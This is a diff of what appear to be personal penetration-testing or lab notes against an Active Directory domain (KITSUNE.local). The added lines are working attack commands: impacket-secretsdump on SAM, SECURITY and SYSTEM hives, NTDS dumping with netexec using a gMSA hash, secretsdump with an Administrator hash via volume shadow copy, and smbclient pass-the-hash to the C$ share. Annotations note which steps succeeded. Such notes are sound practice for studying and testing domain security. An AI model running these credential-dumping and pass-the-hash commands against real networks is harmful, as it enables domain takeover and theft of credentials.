@@ -94,3 +94,14 @@ $cred.UserName
 #runnin cmds as pebbles fail because they dont have winrm
 $cred.GetNetworkCredential().Password
 nxc ldap DC01.KITSUNE.local -u 'pebble' -p 'Password' --gmsa # be careful, don't accidentally do pebbles
+
+
+impacket-secretsdump  -security DC01_10.1.152.66_2026-11-09_192124.SECURITY -system DC01_10.1.152.66_2026-11-09_192124.SYSTEM LOCAL
+impacket-secretsdump  -security DC01_10.1.152.66_2026-11-09_192124.SAM -system DC01_10.1.152.66_2026-11-09_192124.SYSTEM LOCAL
+#Used these to dump SAM, but ntds kept failing. However local admin smbclient worked and using PtH wih the local admin allowed secrets dump
+
+ nxc smb 10.1.139.60 -u 'svc_gmsa$' -H 'hash' --ntds -M backup_operator
+
+impacket-secretsdump 'domain/Administrator@10.0.31.8' -hashes :<hash> -use-vss
+#Note, the secrets dump worked despite not specifying the domain. Maybe cuz of local admin?
+smbclient //10.0.31.8/C$ -U 'Administrator' --pw-nt-hash 'hash'
